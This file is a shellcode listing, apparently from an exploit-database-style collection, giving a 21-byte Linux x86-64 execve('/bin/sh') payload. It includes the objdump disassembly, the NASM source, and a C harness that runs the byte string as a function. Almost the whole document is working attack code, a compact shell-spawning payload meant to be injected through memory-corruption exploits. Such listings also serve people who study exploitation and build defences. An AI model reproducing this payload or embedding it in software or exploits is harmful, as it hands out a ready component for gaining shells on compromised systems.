# Linux/x64 - execve(/bin/sh) Shellcode (21 bytes)
# Author: s1ege
# Tested on: x86_64 GNU/Linux
# Shellcode Length: 21

/*

################################################
objdump disassembly
################################################
401000: 50 push %rax
401001: 48 31 d2 xor %rdx,%rdx
401004: 48 bb 2f 62 69 6e 2f movabs $0x68732f2f6e69622f,%rbx
40100b: 2f 73 68
40100e: 53 push %rbx
40100f: 54 push %rsp
401010: 5f pop %rdi
401011: b0 3b mov $0x3b,%al
401013: 0f 05 syscall
################################################

################################################
shellcode.asm
################################################
; nasm -felf64 shellcode.asm && ld shellcode.o -o shellcode
section .text
global _start
_start:
push rax
xor rdx, rdx
mov rbx, 0x68732f2f6e69622f
push rbx
push rsp
pop rdi
mov al, 59
syscall
################################################
*/
unsigned char shellcode[] = \
"\x50\x48\x31\xd2\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05";

int main() {
int (*ret)() = (int(*)())shellcode;
ret();
return 0;
}